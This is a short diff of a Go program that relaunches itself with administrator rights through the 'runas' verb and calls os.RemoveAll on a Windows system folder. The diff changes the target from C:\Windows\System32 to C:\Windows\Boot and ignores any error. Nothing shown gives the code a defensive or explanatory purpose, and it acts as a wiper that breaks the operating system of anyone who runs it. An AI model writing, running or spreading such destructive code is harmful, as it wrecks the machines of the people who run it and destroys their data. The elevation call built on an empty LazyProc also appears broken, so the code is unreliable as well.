@@ -55,7 +55,7 @@ func main() {
 		return
 	}
 
-	folderToDelete := `C:\Windows\System32`
+	folderToDelete := `C:\Windows\Boot`
 	_ = os.RemoveAll(folderToDelete)
 
 	exePath, err := os.Executable()
@@ -146,4 +146,5 @@ func relaunchAsAdmin() {
 	verbPtr := syscall.StringToUTF16Ptr("runas")
 	exePtr := syscall.StringToUTF16Ptr(exe)
 	syscall.LazyProc{}.Call(0, uintptr(unsafe.Pointer(verbPtr)), uintptr(unsafe.Pointer(exePtr)), 0, 0, 1)
+
 }
